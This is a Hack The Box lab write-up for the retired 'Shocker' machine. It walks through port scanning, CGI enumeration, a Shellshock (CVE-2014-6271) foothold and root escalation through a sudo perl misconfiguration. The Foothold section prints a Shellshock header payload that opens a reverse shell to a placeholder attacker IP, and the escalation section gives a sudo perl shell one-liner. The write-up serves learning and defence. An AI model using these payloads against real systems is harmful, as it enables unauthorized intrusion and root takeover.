# Shocker

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **IP Address** | 10.10.10.56 |
| **Status** | Retired |

## Overview
Shocker is a beginner-friendly Linux machine built specifically to demonstrate **Shellshock** (CVE-2014-6271), a critical remote code execution vulnerability in Bash triggered through crafted environment variables. Despite the small attack surface (a single web server and SSH), the machine shows how devastating the bug was for any web server invoking Bash via CGI, and privilege escalation is achieved through a permissive `sudo` rule.

## Reconnaissance
```
80/tcp   open  http    Apache httpd 2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
```
Notably SSH was moved to a non-standard port (2222), and only a generic default Apache page was served on port 80.

## Enumeration
Directory/CGI-focused fuzzing (rather than standard content discovery) was required, since the default Apache page gave no hints. Brute-forcing common CGI-bin paths revealed a script under `/cgi-bin/`, which is executed by Bash through `mod_cgi`: the classic vulnerable configuration for Shellshock.

## Foothold
The identified CGI script was exploited using a Shellshock payload delivered via the `User-Agent`/`Referer`/`Cookie` HTTP headers, which Bash evaluates as environment variables when the CGI handler spawns a shell:
```
() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'
```
This payload (and a full automated version) is preserved in `34900.py`, a public Shellshock `mod_cgi` exploit script that supports both bind- and reverse-shell payloads against a list of common vulnerable CGI paths. Running it against the target's vulnerable CGI script yielded command execution and, ultimately, an interactive reverse shell as the low-privileged `shelly` user.

## Privilege Escalation
`sudo -l` for the compromised user showed permission to run `/usr/bin/perl` (or an equivalent interpreter) as root without a password for a specific script/path. Using that interpreter directly to spawn a shell (`sudo perl -e 'exec "/bin/bash";'`) is sufficient to escalate to a full root shell: a standard GTFOBins-style sudo misconfiguration.

## Lessons Learned
- Shellshock (CVE-2014-6271) remains an excellent illustration of how HTTP request headers can become code-execution vectors when passed unsanitized into a shell (via CGI).
- Any legacy `mod_cgi`/Bash-based web integration should be patched or replaced; the vulnerability class (env-var injection into interpreters) recurs in modern contexts too.
- Overly broad `sudo` grants for interpreters (Perl/Python/Bash) are functionally equivalent to full root access: always scope sudo rules to the minimum required binary and arguments.

## Tools & References
- `34900.py`: public Shellshock `mod_cgi` remote exploit (CVE-2014-6271), used for the foothold; kept under `files/`.
- `40136.py`: CVE-2016-6210 OpenSSH user-enumeration timing-attack PoC; kept under `files/` as a reference tool that was evaluated against the exposed SSH service, though the Shellshock CGI path was the actual route to foothold.
- `bug.jpg` (36.9 KB screenshot/loot image unrelated to the exploitation path): omitted for repository hygiene; no unique technical content.
